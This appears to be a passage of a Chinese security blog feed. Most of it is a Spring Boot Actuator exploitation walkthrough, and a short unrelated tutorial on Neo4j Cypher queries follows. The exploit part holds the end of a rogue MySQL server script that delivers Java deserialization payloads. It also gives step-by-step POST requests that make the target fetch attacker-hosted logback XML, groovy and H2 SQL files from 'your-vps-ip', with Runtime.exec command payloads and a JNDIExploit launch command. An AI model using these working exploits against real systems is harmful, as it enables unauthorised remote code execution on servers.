class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f90000150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013007343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e035554430653595354454d0f52455045415441424c452d5245414405323838303007000016fe000002000200&#x27;</span></span><br><span class="line">                server_send(conn, _payload)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                server_send(conn, _payload)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                server_send(conn, response_ok)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                server_send(conn, response_ok)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                _data += <span class="string">&#x27;2700000203646566056365736869046f626a73046f626a730269640269640c3f000b000000030000000000&#x27;</span></span><br><span class="line">                _data += <span class="string">&#x27;2900000303646566056365736869046f626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                _payload_hex = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(deserialization_payload)/<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                _payload_length = _payload_hex[<span class="number">2</span>:<span class="number">4</span>] + _payload_hex[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                _data_hex = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(deserialization_payload)/<span class="number">2</span> + <span class="number">5</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                _data_lenght = _data_hex[<span class="number">4</span>:<span class="number">6</span>] + _data_hex[<span class="number">2</span>:<span class="number">4</span>] + _data_hex[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                _data += _data_lenght + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;0131fc&#x27;</span> + _payload_length + deserialization_payload</span><br><span class="line">                _data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                server_send(conn, _data)</span><br><span class="line">                data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                server_send(conn, _payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn.close()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    deserialization_file = <span class="string">r&#x27;payload.ser&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(deserialization_file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(deserialization_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            deserialization_payload = binascii.b2a_hex(f.read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        deserialization_payload = <span class="string">&#x27;aced****(your deserialized hex data)&#x27;</span></span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    BUFFER_SIZE = <span class="number">1024</span></span><br><span class="line">    response_ok = <span class="string">&#x27;0700000200000002000000&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] rogue mysql server Listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST, PORT))</span><br><span class="line">    server_socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server_socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    server_socks.bind((HOST, PORT))</span><br><span class="line">    server_socks.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    run_mysql_server()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过 POST 设置属性值<code>spring.datasource.url</code> 为外部恶意 mysql jdbc url 地址，就是上步的vps开启的mysql地址</p>
<p><img src="https://s2.loli.net/2022/06/26/vkMEBwt5y7o8CaF.png" alt="image-20220626022709041"></p>
<p>在进行网站查询操作时，会触发数据库查询等操作，会与恶意的 mysql jdbc url 建立数据库连接，恶意 mysql server 就会在建立连接的合适阶段返回序列化的 payload 数据，最后目标会反序列化设置好的 gadget，造成RCE漏洞。</p>
<p><img src="https://s2.loli.net/2022/06/26/pjCntSF4qoaLW6r.png" alt="image-20220626022652992"></p>
<p>漏洞原理：</p>
<ol>
<li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
<li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
<li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
<li>然后恶意 mysql server 就会在建立连接的合适阶段返回序列化 payload 数据</li>
<li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
</ol>
<h4 id="restart-logging-config-logback-JNDI-RCE"><a href="#restart-logging-config-logback-JNDI-RCE" class="headerlink" title="restart logging.config logback JNDI RCE"></a>restart logging.config logback JNDI RCE</h4><p>利用条件：</p>
<ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li>
</ul>
<p>利用方法：</p>
<p>步骤一：托管 xml 文件</p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;insertFromJNDI env-entry-name=&quot;ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/Y2FsYw==&quot; as=&quot;appName&quot; /&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<p>步骤二：托管恶意 ldap 服务及代码</p>
<p>参考<a href="https://landgrey.me/blog/21/">文章</a>，修改 <a href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a> 并启动（也可以使用其他方法）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip</span><br></pre></td></tr></table></figure>

<p>步骤三：设置 logging.config 属性</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.xml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.xml&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>步骤四：重启应用</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>通过 POST 方式设置 logging.config 的值</p>
<p><img src="https://s2.loli.net/2022/06/26/d2zMj7IC1tNw8Yg.png" alt="image-20220626022800084"></p>
<p>请求 &#x2F;restart 接口，触发RCE</p>
<p><img src="https://s2.loli.net/2022/06/26/3HVaTonKCjwM9zL.png" alt="image-20220626022748766"></p>
<p>HTTP请求记录</p>
<p><img src="https://s2.loli.net/2022/06/26/E45jPSztM6Q2gCo.png" alt="image-20220626022820766"></p>
<p>JNDIExploit请求记录</p>
<p><img src="https://s2.loli.net/2022/06/26/iItOpsA8y7wCPZr.png" alt="image-20220626022812572"></p>
<p>漏洞原理：</p>
<ol>
<li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li>
<li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li>
<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
<li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
</ol>
<h4 id="restart-logging-config-groovy-RCE"><a href="#restart-logging-config-groovy-RCE" class="headerlink" title="restart logging.config groovy RCE"></a>restart logging.config groovy RCE</h4><p>利用条件：</p>
<ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<p>利用方法：</p>
<p>步骤一：托管 groovy 文件</p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>在根目录放置以 <code>groovy</code> 结尾的 <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<p>步骤二：设置 logging.config 属性</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>步骤三：重启应用</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>通过 POST 设置 logging.config 的属性值</p>
<p><img src="https://s2.loli.net/2022/06/26/bVSuoRCOKBF8xPv.png" alt="image-20220626022916922"></p>
<p>请求 &#x2F;restart 接口，触发RCE</p>
<p><img src="https://s2.loli.net/2022/06/26/fVctDLHwRvFYozC.png" alt="image-20220626022908260"></p>
<p>HTTP 请求记录</p>
<p><img src="https://s2.loli.net/2022/06/26/6zxPD7Y2Zqicbm1.png" alt="image-20220626023421444"></p>
<p>漏洞原理：</p>
<ol>
<li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li><code>logback-classic</code> 组件的 <code>ch.qos.logback.classic.util.ContextInitializer.java</code> 代码文件逻辑中会判断 url 是否以 <code>groovy</code> 结尾</li>
<li>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li>
</ol>
<h4 id="restart-spring-main-sources-groovy-RCE"><a href="#restart-spring-main-sources-groovy-RCE" class="headerlink" title="restart spring.main.sources groovy RCE"></a>restart spring.main.sources groovy RCE</h4><p>利用条件：</p>
<ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<p>步骤一：托管 groovy 文件</p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>在根目录放置以 <code>groovy</code> 结尾的 <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span><br></pre></td></tr></table></figure>

<p>步骤二：设置 spring.main.sources 属性</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.main.sources=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>步骤三：重启应用</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>通过 POST 设置 logging.config 的属性值</p>
<p><img src="https://s2.loli.net/2022/06/26/WsxrTZ9OaFKXNwt.png" alt="image-20220626023718193"></p>
<p>请求 &#x2F;restart 接口，触发RCE</p>
<p><img src="https://s2.loli.net/2022/06/26/xJ29Rk6MKiBoeVZ.png" alt="image-20220626023658597"></p>
<p>HTTP 请求记录</p>
<p><img src="https://s2.loli.net/2022/06/26/PVfcAKTlDLMdwqn.png" alt="image-20220626023553751"></p>
<h4 id="restart-spring-datasource-data-h2-database-RCE"><a href="#restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="restart spring.datasource.data h2 database RCE"></a>restart spring.datasource.data h2 database RCE</h4><p>利用条件：</p>
<ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li>
</ul>
<p>利用方法：</p>
<p>步骤一：托管 sql 文件</p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p>
<blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;open -a Calculator&#x27;);</span><br></pre></td></tr></table></figure>

<p>步骤二：设置 spring.datasource.data 属性</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.data=http://your-vps-ip/example.sql</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>步骤三：重启应用</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>通过 POST 设置 spring.datasource.data 属性值</p>
<p><img src="https://s2.loli.net/2022/06/26/kiajcvJTKyEQuZr.png" alt="image-20220626023828376"></p>
<p>请求 &#x2F;restart 接口，触发RCE</p>
<p><img src="https://s2.loli.net/2022/06/26/uRzp6nr8ytAYZBS.png" alt="image-20220626023808324"></p>
<p>HTTP 请求记录如下</p>
<p><img src="https://s2.loli.net/2022/06/26/4FTCb53KdzQGPSn.png" alt="image-20220626023841255"></p>
<p>漏洞原理：</p>
<ol>
<li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li><code>spring-boot-autoconfigure</code> 组件中的 <code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java</code> 文件代码逻辑中会使用 <code>runScripts</code> 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>neo4j文档学习记录</title>
    <url>/2022/07/14/neo4j%E6%96%87%E6%A1%A3%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="入门指南"><a href="#入门指南" class="headerlink" title="入门指南"></a>入门指南</h3><h4 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h4><p>Neo4j 是世界领先的图形数据库。该架构旨在优化管理、存储和遍历节点和关系。图数据库采用属性图方式，对遍历性能和操作运行时间都有好处。</p>
<span id="more"></span>

<h4 id="Cypher"><a href="#Cypher" class="headerlink" title="Cypher"></a>Cypher</h4><p>Cypher 是 Neo4j 的图形查询语言，允许用户从图形数据库存储和检索数据。它是一种声明性的、受 SQL 启发的语言，用于使用 ASCII 艺术语法描述图形中的视觉模式。该语法提供了一种视觉和逻辑方式来匹配图中节点和关系的模式。</p>
<h4 id="使用Neo4j"><a href="#使用Neo4j" class="headerlink" title="使用Neo4j"></a>使用Neo4j</h4><p>设置使用 Neo4j 和 Cypher 开发应用程序的环境的最简单方法是使用 Neo4j Desktop。从<a href="https://neo4j.com/download/">https://neo4j.com/download/</a>下载</p>
<h3 id="Cypher使用"><a href="#Cypher使用" class="headerlink" title="Cypher使用"></a>Cypher使用</h3><blockquote>
<p>名称是区分大小写的，<code>:PERSON</code>,<code>:Person</code>和<code>:person</code>是三个不同的标签，以及<code>n</code>和<code>N</code>是两个不同的变量。</p>
</blockquote>
<p>查询是使用各种子句构建的，以下是一些用于从图中读取的子句示例：</p>
<ul>
<li><code>MATCH</code>：要匹配的图形模式。这是从图表中获取数据的最常用方法。</li>
<li><code>WHERE</code>: 本身不是一个子句，而是<code>MATCH</code>,<code>OPTIONAL MATCH</code>和的一部分<code>WITH</code>。向模式添加约束，或过滤通过<code>WITH</code>.</li>
<li><code>RETURN</code>: 返回什么。</li>
</ul>
<h4 id="查询更新"><a href="#查询更新" class="headerlink" title="查询更新"></a>查询更新</h4><p>使用以下查询创建一个简单的示例图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE (john:Person &#123;name: &#x27;John&#x27;&#125;)</span><br><span class="line">CREATE (joe:Person &#123;name: &#x27;Joe&#x27;&#125;)</span><br><span class="line">CREATE (steve:Person &#123;name: &#x27;Steve&#x27;&#125;)</span><br><span class="line">CREATE (sara:Person &#123;name: &#x27;Sara&#x27;&#125;)</span><br><span class="line">CREATE (maria:Person &#123;name: &#x27;Maria&#x27;&#125;)</span><br><span class="line">CREATE (john)-[:FRIEND]-&gt;(joe)-[:FRIEND]-&gt;(steve)</span><br><span class="line">CREATE (john)-[:FRIEND]-&gt;(sara)-[:FRIEND]-&gt;(maria)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/14/sbpyaIcj43QWdFM.png" alt="image-20220714150548083"></p>
<p>构造一个查询，查询john朋友的朋友</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (john &#123;name: &#x27;John&#x27;&#125;)-[:FRIEND]-&gt;()-[:FRIEND]-&gt;(fof)</span><br><span class="line">RETURN john.name, fof.name</span><br></pre></td></tr></table></figure>

<p>获取用户列表，从列表中找到具有名称的所有节点，匹配他们的朋友并仅返回那些具有以**’S’<strong>开头的</strong>‘name’**属性的follower user。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (user)-[:FRIEND]-&gt;(follower)</span><br><span class="line">WHERE user.name IN [&#x27;Joe&#x27;, &#x27;John&#x27;, &#x27;Sara&#x27;, &#x27;Maria&#x27;, &#x27;Steve&#x27;] AND follower.name =~ &#x27;S.*&#x27;</span><br><span class="line">RETURN user.name, follower.name</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/14/Jjh3mLWfb2GO4cQ.png" alt="image-20220714151802994"></p>
<p>这些是用于更新图形的子句示例：</p>
<ul>
<li><code>CREATE</code>（和<code>DELETE</code>）：创建（和删除）节点和关系。</li>
<li><code>SET</code>（和<code>REMOVE</code>）：为属性设置值并在节点上添加标签 using<code>SET</code>和 use<code>REMOVE</code>删除它们。</li>
<li><code>MERGE</code>：匹配现有的或创建新的节点和模式。这与独特的约束一起特别有用。</li>
</ul>
<p>这是一个更新图表的示例，将聚合数据写入图表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (n &#123;name: &#x27;John&#x27;&#125;)-[:FRIEND]-(friend)</span><br><span class="line">WITH n, count(friend) AS friendsCount</span><br><span class="line">SET n.friendsCount = friendsCount</span><br><span class="line">RETURN n</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/14/aLMFNruEAXC89Op.png" alt="image-20220714154820494"></p>
<h4 id="路径匹配"><a href="#路径匹配" class="headerlink" title="路径匹配"></a>路径匹配</h4><p><strong>Neo4j Cypher</strong>利用<strong>关系同构</strong>进行路径匹配，是减少结果集大小和防止无限遍历的非常有效的方法。在 Neo4j 中，所有关系都有一个方向。</p>
<p><strong>同态</strong>：如果查询正在寻找长度路径<code>n</code>并且不关心方向，<code>n</code>则将返回一个长度路径，一遍又一遍地重复两个节点。</p>
<p>例如，查找所有具有 5 个关系的路径并且不关心关系方向：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH p = ()-[*5]-()</span><br><span class="line">RETURN nodes(p)</span><br><span class="line"></span><br><span class="line">如果使用同态，这将返回两个结果记录[a,b,a,b,a,b]，以及[b,a,b,a,b,a]。</span><br></pre></td></tr></table></figure>

<p><strong>节点同构</strong>：对于每个路径匹配记录，不能多次返回同一节点。</p>
<p>在另一个双节点示例中，例如<code>(a:Node)-[r:R]-&gt;(b:Node)</code>; 使用节点同构约束只能找到长度为 1 的路径。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH p = ()-[*1]-()</span><br><span class="line">RETURN nodes(p)</span><br><span class="line"></span><br><span class="line">如果使用节点同构，这将返回两个结果记录[a, b]，以及[b, a]。</span><br></pre></td></tr></table></figure>

